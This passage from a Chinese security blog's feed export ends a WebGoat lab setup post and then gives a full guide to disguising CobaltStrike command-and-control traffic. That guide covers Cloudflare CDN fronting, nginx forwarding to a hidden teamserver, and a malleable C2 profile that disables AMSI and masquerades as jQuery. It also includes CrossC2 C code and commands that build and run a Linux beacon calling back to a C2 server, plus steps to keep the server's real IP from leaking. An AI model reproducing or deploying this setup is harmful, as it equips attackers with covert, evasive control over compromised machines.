Burp抓包配置</h2><p>Webgoat为了安全只会在本地127.0.0.1开启靶场服务，使用burp抓包的时，在Google中没法对127.0.0.1抓包。可以使用Firefox设置本地代理，在地址栏输入<code>about:config</code>，然后搜索<code>network.proxy.allow_hijacking_localhost</code>，设置为True：<br><img src="https://i.loli.net/2021/08/05/O8nuI1YxJLkUfTd.png"><br>然后就可以在Burp中拦截数据包了：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4c0c8ade47a5d71de049e8d2809b9263.png"></p><h2 id="0x05-源码打包"><a href="#0x05-源码打包" class="headerlink" title="0x05 源码打包"></a>0x05 源码打包</h2><p>有时候可能有对源码进行修改后重新打包为JAR进行部署的需求，但是对源码进行 <code>mvn clean install</code>时会出现各种报错，如：<br>1.JDK版本错误</p><pre><code class="cmd">No compiler is provided in this environment. Perhaps you are running on a JRE rather than a JDK?</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/16d129fd3ef443f5556a8b8bcc63c015.png"><br>这是由于没有用正确的JDK版本构建出现的错误，可在cmd中设置正确的jdk位置，如<code>set JAVA_HOME=D:\Program Files\JAVA\jdk-15</code>，然后再执行<code>mvn clean install</code>。</p><p>2.UTF-8 序列的字节 1 无效</p><pre><code class="cmd">Failures:[ERROR]   ContentTypeAssignmentTest.workingAttack:74 JSON path "$.feedback"Expected: is "Congratulations. You have successfully completed the assignment."     but: was "You are posting XML but there is no XXE attack performed"</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/02a48a708e953e3675dc688b230d5c35.png"><br>在测试模式中这个问题一直出现，也有相关的<a href="https://github.com/WebGoat/WebGoat/issues/1135">issues</a>，关注后续的官方解决方案。因为这里是测试模式中的问题，所以可以在构建时跳过测试来绕过该问题：</p><pre><code class="stylus">// 跳过单元测试，但是会继续编译mvn clean install -DskipTests //不执行测试用例，也不编译测试用例类mvn clean install -Dmaven.test.skip=true </code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/ee4ebf598bee1525edaffc1273417897.png"></p><p>在IEDA中点击下图标即可跳过测试和联网更新(更新包非常慢，所以可以设置为脱机模式)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/d5db49ddfda04586989617a833313e1f.png"></p><p>编译完成后的JAR包生成在目录<code>webgoat-server/target</code>中，使用 <code>"D:\Program Files\JAVA\jdk-15\bin\java" -Dfile.encoding=UTF-8 -jar webgoat-server-8.2.1-SNAPSHOT.jar</code> 启动：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/0f0ac216140ba8acc8f29ced22909f31.png"></p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br><a href="https://owasp.org/www-project-webgoat/">https://owasp.org/www-project-webgoat/</a><br><a href="https://blog.csdn.net/Decline1/article/details/111591085">https://blog.csdn.net/Decline1/article/details/111591085</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 靶场环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> Webgoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike流量伪装与安全配置</title>
      <link href="/2021/08/19/cobaltstrike-liu-liang-yin-cang-yu-an-quan-pei-zhi/"/>
      <url>/2021/08/19/cobaltstrike-liu-liang-yin-cang-yu-an-quan-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>CobaltStrike在使用过程中经常会涉及到一些安全隐藏方面的配置，我使用的方案是CDN加上nginx转发，再使用profile来修改流量特征，本文对一些细节上的点进行记录，方便以后查阅。首先是域名和CDN上的配置，然后是CobaltStrike一些证书、profile的配置，最后是前置服务器(nginx)的一些配置方法。</p><h2 id="0x02-CDN和域名相关配置"><a href="#0x02-CDN和域名相关配置" class="headerlink" title="0x02 CDN和域名相关配置"></a>0x02 CDN和域名相关配置</h2><p>在freenom申请测试域名(google.tk)后，到cloudflare中获取名称服务器地址:<br><img src="https://i.loli.net/2021/08/05/gYbmjWcxEZJnOFh.png"><br>然后在freenom中配置:<br><img src="https://i.loli.net/2021/08/05/amWJj8v31VLpd5i.png"></p><p><img src="https://i.loli.net/2021/08/05/DUxprVQndS9sc8A.png"><br>CDN中配置A记录，解析IP，并使用代理：<br><img src="https://i.loli.net/2021/08/10/rytjsFLmpWhCDN3.png"><br>这样就能使用cloudflare的CDN加速了，然后开启nginx，配置server_name，访问：<br><img src="https://i.loli.net/2021/08/05/4SGJMUNEm3P18Li.png"></p><p>接下来为域名配置源服务器证书，选择创建证书：<br><img src="https://i.loli.net/2021/08/05/H1fLYowxcvXWaP7.png"></p><p><img src="https://i.loli.net/2021/08/05/clJkq84tH65aoxG.png"><br>将获取到的证书和key文件配置在nginx中，在ubuntu上修改nginx配置文件 <code>/etc/nginx/nginx.conf</code>：：</p><pre><code class="groovy">server {    listen 443 ssl;    server_name m.test.com;    ssl_certificate  key/xxx.com_ssl.pem;    ssl_certificate_key key/xxx.com_key;    ssl_session_timeout 5m;    ssl_ciphers TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-128-CCM-8-SHA256:TLS13-AES-128-CCM-SHA256:EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;        ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;    ssl_prefer_server_ciphers on;    location / {        root /var/www/html;        index index.html index.htm;    }}</code></pre><p>配置好了 <code>nginx -t</code> 检查,然后<code>nginx -s reload</code>重载配置:<br><img src="https://i.loli.net/2021/08/05/TCl2UMb9B1JQj7p.png"></p><p>证书配置好以后，在cloudflare中将SSL/TLS加密模式设置为严格：<br><img src="https://i.loli.net/2021/08/05/8b4o6EtMmQviIkx.png"><br>访问域名，严格的https已经启用，从客户端到CDN，CDN到服务器全部使用HTTPS：<br><img src="https://i.loli.net/2021/08/05/jzmSAcKO6NPxron.png"></p><h2 id="0x03-nginx的反向代理配置"><a href="#0x03-nginx的反向代理配置" class="headerlink" title="0x03 nginx的反向代理配置"></a>0x03 nginx的反向代理配置</h2><p>反向代理配置就是匹配到特定的路径时，nginx将流量转发到后端的CobaltStrike处理，主要有四个路径，用于心跳和接收命令的GET包，用于返回命令执行结果等的POST包，剩下两个是x86和x64的stager，然后匹配到了就使用proxy_pass转发，比如后面会用到jq的profile，在profile中很容易找到这些url，然后配置nginx.conf关键部分如下：</p><pre><code class="nginx">server {    listen 443 ssl;    #要处理的域名    server_name m.test.com;    #证书    ssl_certificate  key/xxx.com_ssl.pem;    ssl_certificate_key key/xxx.com_key;    ssl_session_timeout 5m;    ssl_ciphers TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-128-CCM-8-SHA256:TLS13-AES-128-CCM-SHA256:EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;        ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;    ssl_prefer_server_ciphers on;    #流量转发    location /jquery-3.3.1.slim.min.js {        proxy_pass https://127.0.0.1:60100;        }    location /jquery-3.3.2.slim.min.js {        proxy_pass https://127.0.0.1:60100;        }    location /jquery-3.3.2.min.js {        proxy_pass https://127.0.0.1:60100;        }        location /jquery-3.3.1.min.js {        proxy_pass https://127.0.0.1:60100;        }    #默认首页    location / {        root /var/www/html;        index index.html index.htm;    }}</code></pre><h2 id="0x04-CobaltStrike服务配置"><a href="#0x04-CobaltStrike服务配置" class="headerlink" title="0x04 CobaltStrike服务配置"></a>0x04 CobaltStrike服务配置</h2><p>前置nginx基本配置好了后，接下来进行一些CobaltStrike的配置。主要是证书和profile配置。将压缩包上传到服务器解压后：<br><img src="https://i.loli.net/2021/08/08/G9FqjARPEr1nS8a.png"><br>先用keytool生成证书，这个证书可以用来做为管理端口(默认是50050)或者监听器的端口上的https证书，只要不用默认的随便配置就好：</p><pre><code class="cmd?linenums">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 1314520.com -validity 50000 -dname "CN=, OU=1314520.com, O=1314520.com, L=Redmond, S=Washington, C=US"keytool -importkeystore -srckeystore ./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12</code></pre><p>编辑启动脚本(Linux下的teamserver或者Windows下的teamserver.bat)中的端口和证书配置密码:</p><pre><code class="java?linenums">java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -Xms512m -Xmx1024m -Dcobaltstrike.server_port=5555 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer $*</code></pre><h3 id="简单的Profile配置"><a href="#简单的Profile配置" class="headerlink" title="简单的Profile配置"></a>简单的Profile配置</h3><p>启动参数调好后，Profile是用的<a href="https://github.com/threatexpress/malleable-c2">malleable-c2</a>，在配置文件中按需修改下面的参数:</p><pre><code class="gams">set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"; # 这个改了不要再变，否则上不了线set dns_idle        "8.8.8.8";   #dns的特征修改#header "Content-Type" "application/javascript; charset=utf-8"; #注释默认Type,防止cf缓存</code></pre><p>然后启动<code>teamserve vpsip Password Profile</code>，如Linux下：</p><pre><code class="bash?linenums">chmod +x teamserver./teamserver x.x.x.x password malleable-c2/jquery-c2.4.0.profile</code></pre><p>持久化可以将下面的命令写入文件，如start_teamserver,chmod赋予执行权限后，可以方便的使用./start_teamserver启动，停止就用<code>pkill java</code>，脚本如下：</p><pre><code class="bash">nohup ./teamserver x.x.x.x password malleable-c2/jquery-c2.4.0.profile &gt;/dev/null 2&gt;&amp;1 &amp;</code></pre><p>执行<code>./start_teamserver</code>后可以尝试链接vps5555端口的teamserver了:<br><img src="https://i.loli.net/2021/08/10/Iaywfv31V6HbgLh.png"></p><h3 id="CobaltStrike监听器配置"><a href="#CobaltStrike监听器配置" class="headerlink" title="CobaltStrike监听器配置"></a>CobaltStrike监听器配置</h3><p>进入teamserver后，配置监听器。CDN在HTTPS上会检查SNI用不了域前置(http上可以修改host)，这里使用加速过的域名：<br><img src="https://i.loli.net/2021/08/10/RhiCeKNSg6WPDY5.png"><br>测试上线时会发现执行命令、执行stager不返回的情况，这是因为cdn的缓存原因，到CDN设置页面规则，对js文件绕过缓存：<br><img src="https://i.loli.net/2021/08/10/SiEUeATYO32w9uk.png"><br>配好后清除下缓存：<br><img src="https://i.loli.net/2021/08/10/fdCnIz91qYBpkNS.png"><br>然后测试上线和命令执行返回：<br><img src="https://i.loli.net/2021/08/10/yYZ1pXkCGiOBndm.png"></p><h3 id="Linux和Windows中Profile通用配置"><a href="#Linux和Windows中Profile通用配置" class="headerlink" title="Linux和Windows中Profile通用配置"></a>Linux和Windows中Profile通用配置</h3><p>有时候我们想使用Crossc2来上线cs,但是我们的windows中配置了profile的，linux无法直接上线，所以需要在Crossc2中配置请求的路径，参考<a href="https://github.com/gloxec/CrossC2/tree/cs4.1/protocol_demo">协议演示</a>：<br>根据demo，准了新的init.profile,init.c<br>init.profile：</p><pre><code class="gams">set sample_name "daidaiwoya";set sleeptime "2000";set jitter    "15";set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko";set host_stage "false";set maxdns          "255";set dns_max_txt     "252";set dns_idle        "8.8.8.8"; set dns_sleep       "500"; set dns_stager_prepend ".resources.741256.";set dns_stager_subhost ".feeds.952365.";https-certificate {    set C   "US";    set CN  "jquery.com";    set O   "jQuery";    set OU  "Certificate Authority";    set validity "365";}http-get {    set uri "/getversion";    set verb "GET";    client {        header "Accept" "text/xml";        header "Host" "www.google.com";        header "Referer" "http://www.google.com/";        header "Accept-Encoding" "gzip, deflate";        metadata {            base64url;            prepend "SID=";            header "Cookie";        }    }    server {        header "Server" "nginx";        header "Cache-Control" "max-age=0, no-cache";        header "Pragma" "no-cache";        header "Connection" "keep-alive";        header "Content-Type" "charset=utf-8";        header "X-Cache" "bypass";        output {            base64;            prepend "sign=";            append "5.4.3";            print;        }    }}http-post {    set uri "/kernel.org";    set verb "POST";    client {        header "Accept" "text/xml";        header "Host" "www.google.com";        header "Referer" "http://www.google.com/";        header "Accept-Encoding" "gzip, deflate";        id {            base64;            prepend "__cfduid=";            header "Cookie";        }        output {            base64;            print;        }    }    server {        header "Server" "nginx";        header "Cache-Control" "max-age=0, no-cache";        header "Pragma" "no-cache";        header "Connection" "keep-alive";        header "Content-Type" "charset=utf-8";        header "X-Cache" "bypass";        output {            mask;            base64url;            prepend "sign=";            append "code=2";            print;        }    }}post-ex {    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";    set obfuscate "true";    set smartinject "true";    set amsi_disable "true";}http-config {    set trust_x_forwarded_for "true";}</code></pre><p>init.c</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;// gcc -shared profile.c -o libprofile.so// ./genCrossC2.Linux 192.168.11.1 8086 null libprofile.so Linux x64 ./shellvoid cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {    //修改请求URL和c2profile文件中一致    char *requestBody = "GET /%s HTTP/1.1\r\n"        "Host: www.google.com\r\n"        "Accept: text/xml\r\n"        "Accept-Encoding: gzip, br\r\n"        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko\r\n"        "Cookie: SID=%s\r\n"        //"Referer: https://www.google.com/\r\n"        "Connection: close\r\n\r\n";    char postPayload[20000];    sprintf(postPayload, requestBody, "getversion", reqData);    *outputData_len =  strlen(postPayload);    *outputData = (char *)calloc(1,  *outputData_len);    memcpy(*outputData, postPayload, *outputData_len);}void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {    char *requestBody = "POST /%s HTTP/1.1\r\n"        "Host: www.google.com\r\n"        "Accept: text/xml\r\n"        "Accept-Encoding: gzip, br\r\n"        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko\r\n"        "Cookie: __cfduid=%s\r\n"        "Referer: https://www.google.com/\r\n"        "Connection: close\r\n"        "Content-Length: %d\r\n\r\n%s";    char *postPayload = (char *)calloc(1, strlen(requestBody)+strlen(reqData)+200);    sprintf(postPayload, requestBody, "kernel.org", id, strlen(reqData), reqData);    *outputData_len =  strlen(postPayload);    *outputData = (char *)calloc(1,  *outputData_len);    memcpy(*outputData, postPayload, *outputData_len);    free(postPayload);}char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {    //find_payload() 从原始数据中，找到以"ffffffff1"字符串开始，"eeeeeeee2"字符串结束中间包含的数据    // ffffffff1AAAABBBBCCCCDDDDeeeeeeee2 -&gt; AAAABBBBCCCCDDDD    // *payload_len = xx; // 返回找到的payload长度    // return payload; // 返回找到的payload    rawData = strstr(rawData, start) + strlen(start);    *payload_len = strlen(rawData) - strlen(strstr(rawData, end));    char *payload = (char *)calloc(*payload_len ,sizeof(char));    memcpy(payload, rawData, *payload_len);    return payload; }void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {    char *start = "sign=";    char *end = "5.4.3";    long long payload_len = 0;    *outputData = find_payload(rawData, rawData_len, start, end, &amp;payload_len);    *outputData_len = payload_len;}void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {    char *start = "sign=";    char *end = "code=2";    long long payload_len = 0;    *outputData = find_payload(rawData, rawData_len, start, end, &amp;payload_len);    *outputData_len = payload_len;}</code></pre><p>Profile检查:</p><pre><code class="stylus">java -XX:ParallelGCThreads=4 -Duser.language=en -XX:+UseParallelGC -classpath ./cobaltstrike.jar c2profile.Lint init.profile</code></pre><p>使用profile:</p><pre><code class="lsl">cmd /k teamserver_win.bat 192.168.11.1 123456 init.profile</code></pre><p>然后在Ubuntu上生成二进制文件：</p><pre><code class="stylus">gcc init.c -fPIC -shared -o init.so./genCrossC2.Linux41 192.168.11.1 8086 .cobaltstrike.beacon_keys init.so Linux x64 ./shell</code></pre><p><img src="https://i.loli.net/2021/08/02/wkGnHh1BlFStJub.png"><br>然后执行<code>./shell</code>,成功的返回了beacon:<br><img src="https://i.loli.net/2021/08/02/x81X4CEf3y6uNrg.png"></p><p>2.使用<a href="https://github.com/Richard-Tang/CrossC2-C2Profile">CrossC2-C2Profile</a><br>在github上看到Richard-Tang师傅实现了jquery-c2.4.0.profile的兼容，进行了测试使用(profile日期报错的时候cs启动参数加上 <code>-Duser.language=en</code> )：<br><img src="https://i.loli.net/2021/08/02/rSohkVPEYxjXKBn.png"></p><p>3.Linux在CDN中上线<br>在CrossC2_v2.24中不使用cdn，使用域名可以正常上线；使用cdn后web无日志，无上线；在v2.2.5中使用域名正常上线，但是心跳不稳定，一会就超时了。<br><img src="https://i.loli.net/2021/08/11/t2E8FbaAjlRsYNH.png"></p><h2 id="0x04-CDN后获取真实源IP"><a href="#0x04-CDN后获取真实源IP" class="headerlink" title="0x04 CDN后获取真实源IP"></a>0x04 CDN后获取真实源IP</h2><p>1.Cloudflare请求会自带X-Forwarded-For头，在nginx中设置一下X-Forwarded-For标头(不设置容易获取到127.0.0.1)，CobaltStrike需要在profile中开启 X-Forwarded-For 获取，<br>nginx.conf:</p><pre><code class="nginx">server {        ...        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        #代理到cs        proxy_pass http://127.0.0.1:60100;}</code></pre><p>profile设置：</p><pre><code class="profile">http-config {set trust_x_forwarded_for "true";}</code></pre><p>Cloudflare还可以使用标头CF-Connecting-IP来获取真实IP，使用需要开启标头下划线支持，不然不能用这个参数，一般来说使用这个参数获取的比较准确:</p><pre><code class="nginx">server {        listen 80;        server_name  _;        access_log  logs/cname.log  main;        #开启请求中的下划线支持，方便使用自定义的header头        underscores_in_headers on;         #把CF-Connecting-IP请求头设置为X-Forwarded-For        proxy_set_header X-Forwarded-For $http_cf_connecting_ip;         #代理到cs        proxy_pass http://127.0.0.1:60100;}</code></pre><p>2.在nginx中<code>$remote_addr</code>用来存请求的真实来源IP，一般CDN回源时都会有请求头来记录客户端真实IP(像cf用的上面说的两个，阿里CDN用的Ali-CDN-Real-IP)，nginx记录来源IP的参数是<code>$remote_addr</code>，可以用来在日志中记录IP，使用real_ip_header来设置，比如在Cloudflare中设置<code>$remote_addr</code>真实来源，在server段中配置日志保存格式和路径，可以很方便的对日志进行分别管理查看：</p><pre><code class="nginx"> log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '                      '$status $body_bytes_sent "$http_referer" '                      '"$http_user_agent" "$http_x_forwarded_for"'; server {         ...        server_name www.xx.com;        ...        #CDN回源IP段        set_real_ip_from 103.21.244.0/22;        set_real_ip_from 103.22.200.0/22;        set_real_ip_from 103.31.4.0/22;        set_real_ip_from 104.16.0.0/12;        set_real_ip_from 108.162.192.0/18;        set_real_ip_from 131.0.72.0/22;        set_real_ip_from 141.101.64.0/18;        set_real_ip_from 162.158.0.0/15;        set_real_ip_from 172.64.0.0/13;        set_real_ip_from 173.245.48.0/20;        set_real_ip_from 188.114.96.0/20;        set_real_ip_from 190.93.240.0/20;        set_real_ip_from 197.234.240.0/22;        set_real_ip_from 198.41.128.0/17;        set_real_ip_from 2400:cb00::/32;        set_real_ip_from 2606:4700::/32;        set_real_ip_from 2803:f800::/32;        set_real_ip_from 2405:b500::/32;        set_real_ip_from 2405:8100::/32;        set_real_ip_from 2c0f:f248::/32;        set_real_ip_from 2a06:98c0::/29;        set_real_ip_from 127.0.0.1;        #从请求头中获取IP        real_ip_header CF-Connecting-IP;        #将CF-Connecting-IP里不在set_real_ip_from中的IP当做真实IP        real_ip_recursive on;        #使用$remote_addr        proxy_set_header X-Forwarded-For $remote_addr;        #日志记录        access_log  logs/www.xx.com.log  main;}</code></pre><p>这里要注意一下，如果网站使用了HTTPS，默认情况下CDN会将http重写为https,存在原来80端口的服务访问不了的情况，可以在cdn中关闭自动重写：<br><img src="https://i.loli.net/2021/08/10/hVaCODR4tbjI9zw.png"></p><h2 id="0x05-Nginx中server-name的配置"><a href="#0x05-Nginx中server-name的配置" class="headerlink" title="0x05 Nginx中server_name的配置"></a>0x05 Nginx中server_name的配置</h2><p>nginx中使用server_name定义虚拟主机名，设置server_name指定要处理的域名：</p><pre><code class="nginx">server {    listen 80;    server_name www.baidu.com;    location / {        return 200 'baidu found!';      }}server {    listen 80;    server_name www.qq.com;    location / {        return 200 'qq found!';      }}</code></pre><p><img src="https://i.loli.net/2021/07/21/R6nbVug1tOWhXca.png"></p><p>其他的默认情况：</p><pre><code class="nginx">server {listen 80;server_name _;#可以对host进行一些判断if ($host != "www.qq.com") {        return 501;} location / {        return 200;    }｝</code></pre><p><img src="https://i.loli.net/2021/07/21/NKA53bUMi1GjelI.png"></p><p><img src="https://i.loli.net/2021/07/21/SpfTPxj4sc68AVU.png"></p><h2 id="0x06-Nginx使用WAF"><a href="#0x06-Nginx使用WAF" class="headerlink" title="0x06 Nginx使用WAF"></a>0x06 Nginx使用WAF</h2><p>使用waf可以防御一些恶意扫描，这里使用了<a href="http://openresty.org/cn/">openresty</a>来使用lua的<a href="https://github.com/unixhot/waf">waf</a>，将waf代码放到lua/waf下，然后在nginx配置文件http段中添加引入即可：<br><img src="https://i.loli.net/2021/08/03/oNHk7TExQghsIAJ.png"></p><pre><code class="nginx">    # WAF    lua_shared_dict limit 50m;    lua_package_path "./lua\waf/?.lua;;";    init_by_lua_file "./lua/waf/init.lua";    access_by_lua_file "./lua/waf/access.lua";</code></pre><p>可以在config.lua中进行详细的配置:<br><img src="https://i.loli.net/2021/08/03/ovENWjJAMLgFTy3.png"><br>触发规则会进行拦截:<br><img src="https://i.loli.net/2021/08/03/XNhlgasn3ecwYbZ.png"><br>各种规则可以在rule-config中详细配置。</p><h2 id="0x07-针对来源IP限制返回内容"><a href="#0x07-针对来源IP限制返回内容" class="headerlink" title="0x07 针对来源IP限制返回内容"></a>0x07 针对来源IP限制返回内容</h2><p>有时候请求不是走正常路径过来的，可以设置nginx只对CDN来源IP开放访问，其他地址拒绝(这个会和获取真实IP那个冲突，获取真实IP可以写在location块里，就不要写在server里了)：</p><pre><code class="nginx">http{ #通过if判断值，如果是是CDN的IP，$allow_ip = 0,否则就是default 1。    geo $allow_ip {        default             1;        173.245.48.0/20    0;        103.21.244.0/22    0;        103.22.200.0/22    0;        103.31.4.0/22     0;        141.101.64.0/18    0;        108.162.192.0/18   0;        190.93.240.0/20    0;        188.114.96.0/20    0;        197.234.240.0/22   0;        198.41.128.0/17    0;        162.158.0.0/15     0;        104.16.0.0/12      0;        172.64.0.0/13      0;        131.0.72.0/22      0;    }}server  {        listen 80 default;        #任意host        server_name _;         #以http对IP的访问，不是来自允许的源不提供服务，返回301。        if ($allow_ip){return 301;}         location / {                # 返回内容                return 404;            }    }</code></pre><h2 id="0x08-防止HTTPS访问IP泄露证书"><a href="#0x08-防止HTTPS访问IP泄露证书" class="headerlink" title="0x08 防止HTTPS访问IP泄露证书"></a>0x08 防止HTTPS访问IP泄露证书</h2><p>有时候会发现我们VPS的真实IP泄露了，在nginx配置不当时，就可以通过证书泄露IP，通过fofa看到在该IP上的证书：<br><img src="https://i.loli.net/2021/07/21/a4t9ZCTqcAwO3rK.png"><br>如果要防止nginx泄露IP，不能通过下列检查host来防御，依然会返回证书：</p><pre><code class="bash">if ($host != "www.qq.com") {        return 400;}</code></pre><p>一、可以给IP配置一个自签名的证书，通过https访问IP时返回的就是这个自签名的证书<br>1.免费证书获取可以在csr.chinassl.net和Let’s Encrypt获取，以csr.chinassl.net为例：<br><img src="https://i.loli.net/2021/07/21/pEJN2s3IwTVPCB8.png"><br>然后下载得到CSR文件和KEY文件，然后上传CSR生成证书即可：<br><img src="https://i.loli.net/2021/07/21/eg9ADmYodHzXkOt.png"><br>获取后会得到.crt文件，在nginx中配置即可。</p><p>当然了,还可以使用使用openssl（windows下载:<a href="https://slproweb.com/products/Win32OpenSSL.html%EF%BC%89%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8D%E7%9A%84%E8%AF%81%E4%B9%A6%EF%BC%9A">https://slproweb.com/products/Win32OpenSSL.html）命令生成自签名的证书：</a></p><pre><code class="cmd">openssl req -x509 -nodes -days 3650 -newkey rsa:2048 -keyout ssl.key -out https.crt</code></pre><p>2.nginx配置<br>server_name配置成任意，作为默认配置，没有匹配到server_name时就返回此处配置内容：</p><pre><code class="groovy">server {    listen 443 ssl;    server_name _;    ssl_certificate  key/xxx.com_ssl.crt;    ssl_certificate_key key/xxx.com_key;    ssl_session_timeout 5m;    ssl_ciphers TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-128-CCM-8-SHA256:TLS13-AES-128-CCM-SHA256:EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;        ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;    ssl_prefer_server_ciphers on;    location / {        return 404;    }}</code></pre><p>这样一来访问IP就使用这个自签名的证书，访问域名就使用域名的证书，不会造成IP和域名关联。<br>二、不配置证书，使用CDN灵活模式<br>灵活模式是指客户端与CDN进行HTTPS通信，CDN与服务器HTTP通信，这样证书来源直接就是CDN的，nginx只需要在80端口配置即可：<br><img src="https://i.loli.net/2021/07/30/84bqCA6IvBWeOZY.png" alt="灵活模式"><br>边缘证书中设置始终使用HTTPS:<br><img src="https://i.loli.net/2021/07/30/8dlsYFL6ctDTxu4.png"><br>访问网站，查看证书：<br><img src="https://i.loli.net/2021/07/21/bJRVhYvtU1cqyB2.png"><br>这种方式确实灵活,不用配证书,可以将http的访问自动重写为https。还可以在边缘证书中设置一个随机加密(HTTP/2)，访问的时候是http,但是会使用加密：<br><img src="https://i.loli.net/2021/08/19/Ud7rW9RYjEJMDan.png"></p><h2 id="0x09-参考链接"><a href="#0x09-参考链接" class="headerlink" title="0x09 参考链接"></a>0x09 参考链接</h2><p><a href="https://github.com/unixhot/waf">https://github.com/unixhot/waf</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/14396744.html">https://www.cnblogs.com/Xy--1/p/14396744.html</a></p><p><a href="https://support.cloudflare.com/hc/zh-cn/articles/200170786-%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8B%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E4%BD%BF%E7%94%A8-mod-cloudflare-%E8%AE%B0%E5%BD%95%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E5%9C%B0%E5%9D%80-">https://support.cloudflare.com/hc/zh-cn/articles/200170786-%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8B%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E4%BD%BF%E7%94%A8-mod-cloudflare-%E8%AE%B0%E5%BD%95%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E5%9C%B0%E5%9D%80-</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
            <tag> 流量伪装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPStorm+PHPStudy调试配置</title>
      <link href="/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/"/>
      <url>/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/</url>
      
